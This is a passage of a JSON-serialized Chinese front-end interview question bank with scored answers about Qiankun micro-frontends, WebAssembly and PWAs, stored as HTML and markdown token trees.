焕发新生","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","text":" 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Qiankun 有哪些优点？\\n\\n","depth":2,"text":"Qiankun 有哪些优点？","tokens":[{"type":"text","raw":"Qiankun 有哪些优点？","text":"Qiankun 有哪些优点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。\\n- **1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。\\n- **1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。\\n- **1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。\\n","task":false,"loose":false,"text":"**1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","tokens":[{"type":"text","raw":"**1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","text":"**1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","text":" 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。\\n","task":false,"loose":false,"text":"**1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","tokens":[{"type":"text","raw":"**1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","text":"**1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","text":" 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。\\n","task":false,"loose":false,"text":"**1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","tokens":[{"type":"text","raw":"**1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","text":"**1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","text":" 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","task":false,"loose":false,"text":"**1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","tokens":[{"type":"text","raw":"**1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","text":"**1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","text":" 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Qiankun 如何实现子应用的加载？\\n\\n","depth":2,"text":"Qiankun 如何实现子应用的加载？","tokens":[{"type":"text","raw":"Qiankun 如何实现子应用的加载？","text":"Qiankun 如何实现子应用的加载？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","task":false,"loose":false,"text":"**2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","tokens":[{"type":"text","raw":"**2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","text":"**2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","text":" Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Qiankun 如何处理子应用之间的公共依赖？\\n\\n","depth":2,"text":"Qiankun 如何处理子应用之间的公共依赖？","tokens":[{"type":"text","raw":"Qiankun 如何处理子应用之间的公共依赖？","text":"Qiankun 如何处理子应用之间的公共依赖？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","task":false,"loose":false,"text":"**1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","tokens":[{"type":"text","raw":"**1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","text":"**1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","text":" 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","escaped":false}]}]}]}]},{"key":"前端最前沿","content":"<h1>前端最前沿</h1>\\n<h2>什么是 WebAssembly？其主要用途是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：</li>\\n<li><strong>1：</strong> 高性能计算：如游戏引擎、视频和图像处理。</li>\\n<li><strong>1：</strong> 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。</li>\\n<li><strong>1：</strong> 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。</li>\\n</ul>\\n<h2>WebAssembly (Wasm) 的核心特点有哪些？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。</li>\\n<li><strong>1：</strong>  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。</li>\\n<li><strong>1：</strong>  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。</li>\\n<li><strong>1：</strong>  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。</li>\\n<li><strong>1：</strong>  小体积：Wasm 格式文件较小，传输高效，加载速度快。</li>\\n</ul>\\n<h2>WebAssembly 的工作原理是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。</li>\\n<li><strong>1：</strong> 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。</li>\\n<li><strong>1：</strong> 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。</li>\\n<li><strong>1：</strong> 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。</li>\\n</ul>\\n<h2>什么是PWA？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。</li>\\n</ul>\\n<h2>PWA有那些优点？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（9分）</h4>\\n<ul>\\n<li><strong>1：</strong> 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快</li>\\n<li><strong>1：</strong> 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。</li>\\n<li><strong>1：</strong> 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本</li>\\n<li><strong>1：</strong> 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。</li>\\n<li><strong>1：</strong> SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。</li>\\n<li><strong>1：</strong> 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。</li>\\n<li><strong>1：</strong> 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。</li>\\n<li><strong>1：</strong> 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。</li>\\n<li><strong>1：</strong> 绕过应用商店</li>\\n</ul>\\n<h2>PWA有什么缺点？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3分）</h4>\\n<ul>\\n<li><strong>1：</strong> 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。</li>\\n<li><strong>1：</strong> 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。</li>\\n<li><strong>1：</strong> 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 前端最前沿\\n\\n","depth":1,"text":"前端最前沿","tokens":[{"type":"text","raw":"前端最前沿","text":"前端最前沿","escaped":false}]},{"type":"heading","raw":"## 什么是 WebAssembly？其主要用途是什么？\\n\\n","depth":2,"text":"什么是 WebAssembly？其主要用途是什么？","tokens":[{"type":"text","raw":"什么是 WebAssembly？其主要用途是什么？","text":"什么是 WebAssembly？其主要用途是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：\\n- **1：** 高性能计算：如游戏引擎、视频和图像处理。\\n- **1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。\\n- **1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：\\n","task":false,"loose":false,"text":"**1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","tokens":[{"type":"text","raw":"**1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","text":"**1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","text":" WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 高性能计算：如游戏引擎、视频和图像处理。\\n","task":false,"loose":false,"text":"**1：** 高性能计算：如游戏引擎、视频和图像处理。","tokens":[{"type":"text","raw":"**1：** 高性能计算：如游戏引擎、视频和图像处理。","text":"**1：** 高性能计算：如游戏引擎、视频和图像处理。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 高性能计算：如游戏引擎、视频和图像处理。","text":" 高性能计算：如游戏引擎、视频和图像处理。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。\\n","task":false,"loose":false,"text":"**1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","tokens":[{"type":"text","raw":"**1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","text":"**1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","text":" 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","task":false,"loose":false,"text":"**1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","tokens":[{"type":"text","raw":"**1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","text":"**1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","text":" 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## WebAssembly (Wasm) 的核心特点有哪些？\\n\\n","depth":2,"text":"WebAssembly (Wasm) 的核心特点有哪些？","tokens":[{"type":"text","raw":"WebAssembly (Wasm) 的核心特点有哪些？","text":"WebAssembly (Wasm) 的核心特点有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。\\n- **1：**  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。\\n- **1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。\\n- **1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。\\n- **1：**  小体积：Wasm 格式文件较小，传输高效，加载速度快。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。\\n","task":false,"loose":false,"text":"**1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","tokens":[{"type":"text","raw":"**1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","text":"**1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","text":"  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。\\n","task":false,"loose":false,"text":"**1：**  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","tokens":[{"type":"text","raw":"**1：**  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","text":"**1：**  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","text":"  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。\\n","task":false,"loose":false,"text":"**1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","tokens":[{"type":"text","raw":"**1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","text":"**1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","text":"  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。\\n","task":false,"loose":false,"text":"**1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","tokens":[{"type":"text","raw":"**1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","text":"**1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","text":"  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  小体积：Wasm 格式文件较小，传输高效，加载速度快。","task":false,"loose":false,"text":"**1：**  小体积：Wasm 格式文件较小，传输高效，加载速度快。","tokens":[{"type":"text","raw":"**1：**  小体积：Wasm 